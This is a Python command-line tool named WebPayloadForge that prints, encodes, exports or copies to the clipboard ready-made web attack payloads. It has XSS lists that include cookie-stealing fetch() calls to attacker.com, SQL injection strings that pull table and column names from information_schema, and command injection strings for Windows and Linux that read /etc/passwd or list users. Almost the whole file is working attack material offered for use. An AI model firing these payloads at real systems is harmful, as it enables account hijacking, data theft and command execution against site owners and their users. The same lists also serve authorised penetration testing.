#!/usr/bin/env python3

import argparse
import json
import base64
import urllib.parse
import pyperclip
from rich.console import Console
from rich.panel import Panel
from rich import print as rprint
from colorama import init, Fore, Style
import html
import binascii

# Initialize colorama
init()

class PayloadGenerator:
    def __init__(self):
        self.console = Console()
        self.xss_payloads = {
            'reflected': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '"><svg/onload=alert(1)>',
                'javascript:alert(1)',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<svg><script>alert(1)</script></svg>',
                '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<input autofocus onfocus=alert(1)>'
            ],
            'stored': [
                '<script>alert(document.cookie)</script>',
                '<img src=x onerror=alert(document.cookie)>',
                '<svg/onload=alert(document.cookie)>',
                '"><script>alert(document.cookie)</script>',
                '"><img src=x onerror=alert(document.cookie)>',
                '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
                '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">',
                '<svg/onload="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">'
            ],
            'dom': [
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '"><svg/onload=alert(1)>',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'javascript:fetch("https://attacker.com/steal?cookie="+document.cookie)',
                'data:text/html,<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>'
            ]
        }

        self.sqli_payloads = {
            'error': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "' OR 1=1#",
                "' OR '1'='1'/*",
                "' OR 1=1/*",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1#",
                "' AND 1=2#"
            ],
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--"
            ],
            'blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1#",
                "' AND 1=2#",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(USER(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ]
        }

        self.cmd_payloads = {
            'windows': [
                '& dir',
                '; dir',
                '| dir',
                '&& dir',
                '|| dir',
                '`dir`',
                '$(dir)',
                ';net user',
                '&net user',
                '|net user',
                ';whoami',
                '&whoami',
                '|whoami',
                ';ipconfig',
                '&ipconfig',
                '|ipconfig',
                ';systeminfo',
                '&systeminfo',
                '|systeminfo'
            ],
            'linux': [
                '; ls',
                '& ls',
                '| ls',
                '&& ls',
                '|| ls',
                '`ls`',
                '$(ls)',
                ';id',
                '&id',
                '|id',
                ';whoami',
                '&whoami',
                '|whoami',
                ';cat /etc/passwd',
                '&cat /etc/passwd',
                '|cat /etc/passwd',
                ';uname -a',
                '&uname -a',
                '|uname -a'
            ]
        }

    def encode_payload(self, payload, encoding_type):
        if encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == 'url':
            return urllib.parse.quote(payload)
        elif encoding_type == 'hex':
            return ''.join([hex(ord(c))[2:] for c in payload])
        elif encoding_type == 'unicode':
            return ''.join([f'\\u{ord(c):04x}' for c in payload])
        elif encoding_type == 'html':
            return html.escape(payload)
        elif encoding_type == 'binary':
            return ' '.join(format(ord(c), '08b') for c in payload)
        elif encoding_type == 'octal':
            return ' '.join(format(ord(c), '03o') for c in payload)
        return payload

    def generate_xss(self, xss_type, encode=None):
        payloads = self.xss_payloads.get(xss_type, [])
        if encode:
            payloads = [self.encode_payload(p, encode) for p in payloads]
        return payloads

    def generate_sqli(self, sqli_type, encode=None):
        payloads = self.sqli_payloads.get(sqli_type, [])
        if encode:
            payloads = [self.encode_payload(p, encode) for p in payloads]
        return payloads

    def generate_cmd(self, os_type, encode=None):
        payloads = self.cmd_payloads.get(os_type, [])
        if encode:
            payloads = [self.encode_payload(p, encode) for p in payloads]
        return payloads

    def display_payloads(self, payloads, title):
        self.console.print(Panel.fit(
            "\n".join(payloads),
            title=title,
            border_style="green"
        ))

    def save_to_json(self, payloads, filename):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(payloads, f, indent=4)

    def copy_to_clipboard(self, payloads):
        pyperclip.copy('\n'.join(payloads))

def display_banner():
    banner = """
    ██╗    ██╗███████╗██████╗     ██████╗  █████╗ ██╗  ██╗██╗      ██████╗ ███████╗██████╗ ███████╗
    ██║    ██║██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██║  ██║██║     ██╔═══██╗██╔════╝██╔══██╗██╔════╝
    ██║ █╗ ██║█████╗  ██████╔╝    ██████╔╝███████║███████║██║     ██║   ██║█████╗  ██████╔╝█████╗  
    ██║███╗██║██╔══╝  ██╔══██╗    ██╔═══╝ ██╔══██║██╔══██║██║     ██║   ██║██╔══╝  ██╔══██╗██╔══╝  
    ╚███╔███╔╝███████╗██████╔╝    ██║     ██║  ██║██║  ██║███████╗╚██████╔╝██║     ██║  ██║███████╗
     ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝
    """
    rprint(banner)

def main():
    parser = argparse.ArgumentParser(description='WebPayloadForge - Advanced Payload Generator')
    parser.add_argument('--xss', action='store_true', help='Generate XSS payloads')
    parser.add_argument('--sqli', action='store_true', help='Generate SQL injection payloads')
    parser.add_argument('--cmd', action='store_true', help='Generate command injection payloads')
    parser.add_argument('--type', choices=['reflected', 'stored', 'dom', 'error', 'union', 'blind'],
                      help='Type of payload to generate')
    parser.add_argument('--os', choices=['windows', 'linux'], help='OS for command injection payloads')
    parser.add_argument('--encode', choices=['base64', 'url', 'hex', 'unicode', 'html', 'binary', 'octal'],
                      help='Encoding type for payloads')
    parser.add_argument('--output', choices=['json', 'clipboard'],
                      help='Output format (json or clipboard)')
    parser.add_argument('--file', help='Output file name for JSON export')

    args = parser.parse_args()
    generator = PayloadGenerator()

    # Display banner
    display_banner()

    if args.xss:
        if not args.type:
            args.type = 'reflected'
        payloads = generator.generate_xss(args.type, args.encode)
        generator.display_payloads(payloads, f"XSS Payloads ({args.type})")
    elif args.sqli:
        if not args.type:
            args.type = 'error'
        payloads = generator.generate_sqli(args.type, args.encode)
        generator.display_payloads(payloads, f"SQL Injection Payloads ({args.type})")
    elif args.cmd:
        if not args.os:
            args.os = 'linux'
        payloads = generator.generate_cmd(args.os, args.encode)
        generator.display_payloads(payloads, f"Command Injection Payloads ({args.os})")
    else:
        parser.print_help()
        return

    if args.output == 'json':
        filename = args.file or 'payloads.json'
        generator.save_to_json(payloads, filename)
        print(f"\nPayloads saved to {filename}")
    elif args.output == 'clipboard':
        generator.copy_to_clipboard(payloads)
        print("\nPayloads copied to clipboard")

if __name__ == '__main__':
    main() 